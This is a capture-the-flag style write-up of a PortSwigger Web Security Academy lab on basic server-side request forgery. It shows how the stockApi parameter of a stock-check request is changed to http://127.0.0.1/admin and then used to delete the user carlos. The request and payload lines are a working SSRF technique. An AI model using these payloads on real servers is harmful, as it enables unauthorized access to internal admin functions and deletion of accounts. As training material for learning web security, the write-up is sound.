# Lab Writeup: Basic SSRF Against The Local Server

URL: https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/ssrf-apprentice/ssrf/lab-basic-ssrf-against-localhost#

## Description

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

## Solution

1. Go to one of the products' page
2. Click "check stock" you'll see the following request when you intercept using Burpsuite

   ```
   POST /product/stock HTTP/2
   Host: 0aa800ce04f22ceb87ad087d005200fa.web-security-academy.net
   Cookie: session=TJEwANmG3aZb61HrxiZyE0OroIaqzNzH
   Content-Length: 107
   Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"
   Sec-Ch-Ua-Platform: "Linux"
   Sec-Ch-Ua-Mobile: ?0
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
   Content-Type: application/x-www-form-urlencoded
   Accept: */*
   Origin: https://0aa800ce04f22ceb87ad087d005200fa.web-security-academy.net
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: cors
   Sec-Fetch-Dest: empty
   Referer: https://0aa800ce04f22ceb87ad087d005200fa.web-security-academy.net/product?productId=1
   Accept-Encoding: gzip, deflate, br
   Accept-Language: en-US,en;q=0.9
   Priority: u=1, i

    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
   ```

3. Change the stockApi to `http://127.0.0.1/` then we can see a link to admin panel in the response

   ```
    <section class="top-links">
        <a href=/>Home</a><p>|</p>
        <a href="/admin">Admin panel</a><p>|</p>
        <a href="/my-account">My account</a><p>|</p>
    </section>
   ```

4. Change the stockApi again to `http://127.0.0.1/admin` then we can see a link to delete carlos in the response

   ```
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
   ```

5. Change the stockApi again to `http://127.0.0.1/admin/delete?username=carlos` then the lab is solved
